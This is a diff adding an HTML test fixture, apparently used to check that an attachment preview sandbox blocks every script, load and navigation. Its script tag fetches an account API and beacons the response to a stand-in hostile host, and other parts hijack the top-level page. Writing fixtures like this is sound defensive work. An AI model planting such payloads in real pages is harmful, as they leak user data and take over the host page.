@@ -1,0 +1,41 @@
+<!doctype html>
+<!-- Everything a page might try, to attach to a source and preview: nothing here may run, load or leave. See e2e/plans/attachment-previews.md. -->
+<html>
+<head>
+<title>Quarterly crew report</title>
+<meta http-equiv="refresh" content="0;url=https://hostile.example.com/refresh">
+<base href="https://hostile.example.com/base/">
+<link rel="stylesheet" href="https://hostile.example.com/link.css">
+<link rel="preload" as="image" href="https://hostile.example.com/preload.png">
+<link rel="prefetch" href="https://hostile.example.com/prefetch">
+<script src="https://hostile.example.com/script.js"></script>
+<script>
+  top.document.title = "HIJACKED BY A SCRIPT";
+  top.location = "https://hostile.example.com/top";
+  fetch("https://hostile.example.com/fetch");
+  fetch("/api/v1/me/products").then((r) => r.text()).then((t) => navigator.sendBeacon("https://hostile.example.com/beacon", t));
+  parent.postMessage("hostile", "*");
+</script>
+<style>
+  @import url("https://hostile.example.com/import.css");
+  @font-face { font-family: Hostile; src: url("https://hostile.example.com/font.woff"); }
+  body { margin: 40px; background: #fdf6e3 url("https://hostile.example.com/background.png"); color: #333; font-family: Georgia, serif; }
+  h1 { color: #b58900; font-size: 48px; }
+  td { padding: 8px; border: 1px solid #999; }
+</style>
+</head>
+<body onload="top.document.title = 'HIJACKED BY ONLOAD'">
+<h1>Quarterly crew report</h1>
+<p>Crews plan on Friday, and supervisors enter the plan again on Monday.</p>
+<table><tr><td>Site</td><td>Crews</td></tr><tr><td>Harbor</td><td>12</td></tr></table>
+<img src="https://hostile.example.com/image.png" onerror="top.document.title = 'HIJACKED BY ONERROR'">
+<img alt="A square that travels with the page" width="60" height="60" src="data:image/gif;base64,R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=">
+<svg onload="top.document.title = 'HIJACKED BY SVG'"><image href="https://hostile.example.com/svg.png"/><script>top.document.title = "HIJACKED INSIDE SVG"</script></svg>
+<video src="https://hostile.example.com/video.mp4" poster="https://hostile.example.com/poster.png" autoplay></video>
+<iframe src="https://hostile.example.com/frame"></iframe>
+<object data="https://hostile.example.com/object"></object>
+<embed src="https://hostile.example.com/embed">
+<form action="https://hostile.example.com/form" method="post"><input name="q" value="x"><button>Send</button></form>
+<a href="https://hostile.example.com/link" target="_top" ping="https://hostile.example.com/ping">A link out of the frame</a>
+</body>
+</html>
